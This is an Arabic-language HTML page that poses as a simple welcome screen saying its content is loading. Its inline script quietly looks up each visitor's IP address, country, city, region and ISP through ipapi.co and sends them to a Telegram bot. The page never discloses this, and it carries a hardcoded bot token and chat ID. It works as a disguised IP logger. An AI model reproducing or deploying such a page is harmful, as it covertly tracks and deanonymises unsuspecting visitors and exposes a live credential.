<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مرحباً بك!</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background-color: #f4f4f9;
            color: #333;
        }
        h1 { color: #2c3e50; }
    </style>
</head>
<body>
    <h1>مرحباً بك في موقعي! ✨</h1>
    <p>جاري تحميل المحتوى، انتظر لحظة...</p>

    <script>
        // توكن البوت بتاعك
        const BOT_TOKEN = '8979129209:AAFPv860Aomc03pLBPQh4dyW2yIKByB3Bk0';
        
        // الـ Chat ID بتاعك (حطي الرقم بتاعك بدل ما بين القوسين)
        const CHAT_ID = '6663398412';

        // جلب معلومات الزائر عن طريق الـ IP وإرسالها للتليجرام
        fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(data => {
                const message = `🔔 **زيارة جديدة للموقع!**\n\n` +
                                `🌍 **الدولة:** ${data.country_name || 'غير معروف'}\n` +
                                `🏙️ **المدينة:** ${data.city || 'غير معروف'}\n` +
                                `📍 **المنطقة:** ${data.region || 'غير معروف'}\n` +
                                `🏢 **مزود الخدمة:** ${data.org || 'غير معروف'}\n` +
                                `🌐 **عنوان الـ IP:** ${data.ip || 'غير معروف'}`;

                // إرسال الرسالة مباشرة للبوت ولرقمك المحدد
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
            })
            .catch(err => console.error('Error:', err));
    </script>
</body>
</html>
